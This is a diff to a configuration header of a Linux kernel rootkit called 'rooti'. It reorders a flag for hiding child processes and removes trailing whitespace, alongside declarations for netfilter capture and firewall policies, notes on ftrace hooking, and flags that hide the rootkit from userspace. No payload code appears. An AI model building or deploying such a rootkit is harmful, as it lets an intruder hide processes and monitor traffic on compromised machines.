@@ -1,7 +1,7 @@
 #ifndef _ROOTI_CONFIG_H
 #define _ROOTI_CONFIG_H
 
-#include <linux/types.h> 
+#include <linux/types.h>
 #include <linux/filter.h>
 #include "policy.h"
 
@@ -36,8 +36,8 @@ extern const struct rooti_net_policy ROOTI_PCAP_POLICY;
 // These rules will apply regardless of any other netfilter hooks installed.
 extern const struct rooti_net_policy ROOTI_FW_POLICY;
 
-/* 
- * Recursion loops protection mechanism - often times hooked functions call 
+/*
+ * Recursion loops protection mechanism - often times hooked functions call
  * their original predecessor. The call to the original kernel function would trigger the
  * ftrace callback, which would in turn point to the hook function, which would call the original function
  * and so on and so forth. We've got two ways to handle this:
@@ -49,6 +49,9 @@ extern const struct rooti_net_policy ROOTI_FW_POLICY;
  */
 #define ROOTI_USE_FENTRY_OFFSET
 
+// Indicates whether child processes should be hidden along with the parent
+#define ROOTI_HIDE_CHILD_PROCS
+
 // Indicates whether this rootkit should be hidden from userspace.
 // This flag should only be set for debugging purposes
 #define ROOTI_DEBUG_SHOWME
@@ -56,8 +59,5 @@ extern const struct rooti_net_policy ROOTI_FW_POLICY;
 // Indicates whether logging is enabled.
 // This flag should only be set for debugging purposes
 #define ROOTI_DEBUG_LOGGING
-
-// Indicates whether child processes should be hidden along with the parent
-#define ROOTI_HIDE_CHILD_PROCS
 
 #endif
